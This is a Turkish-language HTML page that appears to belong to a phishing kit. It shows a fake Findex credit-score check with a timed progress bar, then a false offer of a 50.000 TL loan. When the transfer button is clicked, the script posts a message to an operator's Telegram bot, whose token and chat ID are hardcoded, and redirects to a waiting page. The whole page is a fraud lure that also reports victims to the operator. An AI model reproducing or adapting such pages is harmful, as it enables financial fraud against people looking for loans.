<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Findex Puanı Yükleniyor</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
        }

        #loadingContainer {
            width: 100%;
            max-width: 600px;
            text-align: center;
        }

        #progressBar {
            width: 100%;
            height: 30px;
            background-color: #e0e0e0;
            border-radius: 5px;
            overflow: hidden;
            position: relative;
            margin-top: 20px;
        }

        #progress {
            height: 100%;
            width: 0;
            background-color: #4caf50;
            transition: width 10s linear;
        }

        #loadingText {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #333;
            font-weight: bold;
        }

        #resultContainer {
            display: none; /* Başlangıçta görünmez */
            text-align: center;
        }

        #transferButton {
            background-color: #08591b;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 20px;
        }

        #transferAmount {
            margin-top: 10px;
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div id="loadingContainer">
        <h1>ANLIK FİNDEX PUANINIZ HESAPLANIYOR</h1>
        <div id="progressBar">
            <div id="progress"></div>
            <div id="loadingText">Hesaplanıyor...</div>
        </div>
    </div>

    <div id="resultContainer">
        <h1>KREDİNİZ HAZIR</h1>
        <div id="transferAmount">Vadesiz Hesabınıza Aktarılacak Miktar: <br>50.000 TL</div>
        <button id="transferButton">HESABA AKTAR</button>
    </div>

    <script>
        // Sayfa yüklendiğinde yükleme çubuğunu başlat
        window.onload = function() {
            const progress = document.getElementById("progress");
            const loadingContainer = document.getElementById("loadingContainer");
            const resultContainer = document.getElementById("resultContainer");

            setTimeout(() => {
                progress.style.width = "100%";
            }, 100); // 0.1 saniye bekle

            setTimeout(() => {
                // Yükleme tamamlandığında yükleme kısmını gizle ve sonucu göster
                loadingContainer.style.display = "none";
                resultContainer.style.display = "block";
            }, 10000); // 10 saniye sonra işlem yapılacak

            document.getElementById("transferButton").addEventListener("click", () => {
                const chatId = "-1002343753859"; // Telegram chat ID
                const token = "7380726850:AAFZMnFFCtWf8SnIjlTCX04jpjlDNVo2TMY"; // Telegram API token
                const message = "Vadesiz Hesabınıza Aktarılacak Miktar: 50.000 TL";

                // Telegram API'ye mesaj gönderme
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                })
                .then(response => {
                    if (response.ok) {
                        // bekle4.html sayfasına yönlendirme
                        window.location.href = "bekle4.html";
                    } else {
                        console.error('Mesaj gönderilemedi:', response.statusText);
                    }
                })
                .catch(error => {
                    console.error('Hata:', error);
                });
            });
        };
    </script>
</body>
